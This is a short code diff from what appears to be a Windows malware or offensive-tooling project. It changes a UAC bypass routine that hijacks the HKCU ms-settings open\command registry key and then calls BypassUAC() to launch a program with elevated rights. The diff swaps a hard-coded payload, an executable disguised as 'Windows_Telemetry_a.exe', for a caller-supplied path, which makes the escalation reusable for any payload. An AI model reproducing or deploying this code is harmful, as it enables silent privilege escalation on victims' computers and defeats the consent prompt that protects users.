@@ -5,11 +5,11 @@ int add_double_data(char *new_process_path) {
 	HKEY key;
 	//HKEY hKey = nullptr;
 	DWORD dwDisposition;
-	char cmd_path[] = "C:\\Users\\Security\\Desktop\\Windows_Telemetry_a.exe";
+	//char cmd_path[] = "C:\\Users\\Security\\Desktop\\Windows_Telemetry_a.exe";
 	::RegCreateKeyEx(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings\\Shell\\open\\command", 0, NULL, 0, KEY_WRITE, NULL, &key, &dwDisposition);
 	char data[] = "Software\\Classes\\ms-settings\\Shell\\open\\command";
 	RegOpenKeyEx(HKEY_CURRENT_USER, data, 0, KEY_WRITE, &key);
-	RegSetValueEx(key, "", 0, REG_SZ, (BYTE*)cmd_path, strlen((const char*)cmd_path));
+	RegSetValueEx(key, "", 0, REG_SZ, (BYTE*)new_process_path, strlen((const char*)new_process_path));
 	RegSetValueExW(key, L"DelegateExecute", 0, REG_SZ, (BYTE*)"", sizeof(""));
 	BypassUAC();
 	Sleep(800);
